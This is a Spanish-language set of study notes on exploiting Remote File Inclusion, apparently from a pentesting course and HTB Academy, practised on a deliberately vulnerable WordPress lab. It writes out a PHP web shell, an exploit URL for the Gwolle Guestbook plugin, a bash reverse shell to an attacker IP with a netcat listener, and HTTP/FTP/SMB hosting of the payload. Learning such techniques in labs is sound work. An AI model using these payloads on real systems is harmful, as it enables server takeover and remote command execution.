---
tags:
  - Web
  - Explotacion
  - RFI
---

# Notas

Para realizar este ataque, lo primero que tenemos que tener es un servidor web con un script malicioso.

**INICIAR SERVIDOR WEB**
```bash
sudo python3 -m http.server 80
```

**SCRIPT**
```php
<?php
	system("whoami");
?>
```

Con esto ahora desde un parámetro vulnerable de la web, tenemos que ingresar en el valor de la pagina web creada apuntando al script que hemos creado.
En el caso de que en el servidor web creado solo haya el script, no hace falta apuntarlo.

Sería de la siguiente manera:

```
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.149/
```

Se esta manera se ejecutara el contenido del script creado desde la maquina victima.

## Tomar control de la máquina

Creamos una consola con el script de php

```php
<?php
	system($_GET['cmd']);
?>
```

Si apuntamos, ahora podemos ejecutar comandos de la siguiente manera:

```
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.149/&cmd=whoami
```

Ahora vamos a enviarnos una reverse shell desde la url.
Primero nos ponemos en escucha por un puerto.

```bash
nc -nlvp 4444
```

Enviamos desde la url a ese puerto lo siguiente pero encodeado en base64

```
bash -c "bash -i >& /dev/tcp/192.168.1.149/4444 0>&1"
```

**Encodeado**

```
bash -c "bash -i >%26 /dev/tcp/192.168.1.149/4444 0>%261"
```

**URL COMPLETA**

```
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.149/&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.149/4444 0>%261"
```
# Hack4u

La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.

En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:

- **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwolle Guestbook**‘ de WordPress:

- **Gwolle Guestbook**: [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)


# HTB Academy

## Remote File Inclusion (RFI)

Esto permite dos beneficios principales:

1. Enumerar puertos y aplicaciones web solo locales (es decir. SSRF)
2. Obtener la ejecución remota de código mediante la inclusión de un script malicioso que alojamos

### LFI vs Remote

Cuando una función vulnerable nos permite incluir archivos remotos, es posible que podamos alojar un script malicioso y luego incluirlo en la página vulnerable para ejecutar funciones maliciosas y obtener la ejecución remota de código. Si nos referimos a la tabla de la primera sección, vemos que las siguientes son algunas de las funciones que (si son vulnerables) permitirían RFI:

|**Función**|**Leer Contenido**|**Ejecutar**|**URL remota**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NETO**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

Como podemos ver, casi cualquier vulnerabilidad RFI también es una vulnerabilidad LFI, ya que cualquier función que permita incluir URL remotas generalmente también permite incluir las locales. Sin embargo, un LFI puede no ser necesariamente un RFI. Esto se debe principalmente a tres razones:

1. La función vulnerable puede no permitir incluir URL remotas
2. Solo puede controlar una parte del nombre del archivo y no toda la envoltura del protocolo (ej: `http://`, `ftp://`, `https://`).
3. La configuración puede evitar RFI por completo, ya que la mayoría de los servidores web modernos deshabilitan la inclusión de archivos remotos de forma predeterminada.


### Verificación de RFI

En la mayoría de los idiomas, incluidas las URL remotas se considera una práctica peligrosa, ya que puede permitir tales vulnerabilidades. Esta es la razón por la cual la inclusión remota de URL generalmente está deshabilitada de forma predeterminada. Por ejemplo, cualquier inclusión remota de URL en PHP requeriría el `allow_url_include` configuración a habilitar. Podemos comprobar si esta configuración está habilitada a través de LFI, como hicimos en el apartado anterior:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Sin embargo, esto puede no ser siempre confiable, ya que incluso si esta configuración está habilitada, la función vulnerable puede no permitir la inclusión remota de URL para empezar. Por lo tanto, una forma más confiable de determinar si una vulnerabilidad LFI también es vulnerable a RFI es `try and include a URL`y ver si podemos obtener su contenido. Al principio, `we should always start by trying to include a local URL` para garantizar que nuestro intento no sea bloqueado por un firewall u otras medidas de seguridad. Entonces, usemos (`http://127.0.0.1:80/index.php`) como nuestra cadena de entrada y ver si se incluye:


```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```


![](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

Como podemos ver, el `index.php` la página se incluyó en la sección vulnerable (es decir. Historial Descripción), por lo que la página es realmente vulnerable a RFI, ya que podemos incluir URL. Además, el `index.php` la página no se incluyó como texto de código fuente, sino que se ejecutó y se representó como PHP, por lo que la función vulnerable también permite la ejecución de PHP, lo que puede permitirnos ejecutar código si incluimos un script PHP malicioso que alojamos en nuestra máquina.

También vemos que pudimos especificar el puerto `80` y obtenga la aplicación web en ese puerto. Si el servidor de back-end alojaba otras aplicaciones web locales (por ejemplo, puerto `8080`), entonces podemos acceder a ellos a través de la vulnerabilidad RFI aplicando técnicas SSRF en él.

>**Nota:** 
>Puede que no sea ideal incluir la página vulnerable en sí (es decir, index.php), ya que esto puede causar un bucle de inclusión recursiva y causar un DoS al servidor de back-end.


### Ejecución Remota de código con RFI

El primer paso para obtener la ejecución remota de código es crear un script malicioso en el lenguaje de la aplicación web, PHP en este caso. Podemos usar un shell web personalizado que descargamos de internet, usar un script de shell inverso, o escribir nuestro propio shell web básico como hicimos en el apartado anterior, que es lo que haremos en este caso:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora, todo lo que necesitamos hacer es alojar este script e incluirlo a través de la vulnerabilidad RFI. Es una buena idea escuchar en un puerto HTTP común como `80` o `443`, ya que estos puertos pueden estar en la lista blanca en caso de que la aplicación web vulnerable tenga un firewall que impida las conexiones salientes. Además, podemos alojar el script a través de un servicio FTP o un servicio SMB, como veremos a continuación.


#### HTTP

Ahora, podemos iniciar un servidor en nuestra máquina con un servidor python básico con el siguiente comando, como sigue:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT> --bind <IP>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Ahora, podemos incluir nuestro shell local a través de RFI, como lo hicimos antes, pero usando `<OUR_IP>` y nuestro `<LISTENING_PORT>`. También especificaremos el comando con el que se ejecutará `&cmd=id`:


```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```


![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, obtuvimos una conexión en nuestro servidor python, y se incluyó el shell remoto, y ejecutamos el comando especificado:

```shell-session
vcrdcr@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

>**Consejo:** 
>Podemos examinar la conexión en nuestra máquina para asegurarnos de que la solicitud se envía tal como la especificamos. Por ejemplo, si vimos una extensión adicional (.php) que se adjuntó a la solicitud, entonces podemos omitirla de nuestra carga útil

#### FTP

También podemos alojar nuestro script a través del protocolo FTP. Podemos iniciar un servidor FTP básico con Python `pyftpdlib`, como sigue:

Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] -> starting FTP server on 0.0.0.0:21, pid=23686 
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

Esto también puede ser útil en caso de que los puertos http estén bloqueados por un firewall o el `http://` la cadena es bloqueada por un WAF. Para incluir nuestro script, podemos repetir lo que hicimos antes, pero usar el `ftp://` esquema en la URL, de la siguiente manera:


```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```


Como podemos ver, esto funcionó de manera muy similar a nuestro ataque http, y el comando fue ejecutado. De forma predeterminada, PHP intenta autenticarse como un usuario anónimo. Si el servidor requiere autenticación válida, las credenciales se pueden especificar en la URL, de la siguiente manera:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### SMB

Si la aplicación web vulnerable está alojada en un servidor Windows (lo que podemos decir de la versión del servidor en los encabezados de respuesta HTTP), entonces no necesitamos `allow_url_include` configuración que se habilitará para la explotación de RFI, ya que podemos utilizar el protocolo SMB para la inclusión remota de archivos. Esto se debe a que Windows trata los archivos en servidores SMB remotos como archivos normales, a los que se puede hacer referencia directamente con una ruta UNC.


Podemos hacer girar un servidor SMB usando `Impacket's smbserver.py`, que permite la autenticación anónima por defecto, de la siguiente manera:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ahora, podemos incluir nuestro script usando una ruta UNC (por ejemplo. `\\<OUR_IP>\share\shell.php`), y especifique el comando con (`&cmd=whoami`) como hicimos antes:


```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```


![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

Como podemos ver, este ataque funciona al incluir nuestro script remoto, y no necesitamos que se habilite ninguna configuración no predeterminada. Sin embargo, debemos tener en cuenta que esta técnica es `more likely to work if we were on the same network`, ya que el acceso a servidores SMB remotos a través de Internet puede deshabilitarse de forma predeterminada, dependiendo de las configuraciones del servidor de Windows.


# Laboratorios

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:

- **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwolle Guestbook**‘ de WordPress: (NOS TENEMOS QUE DESCARGAR LA 1.5.3)

- **Gwolle Guestbook**: [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)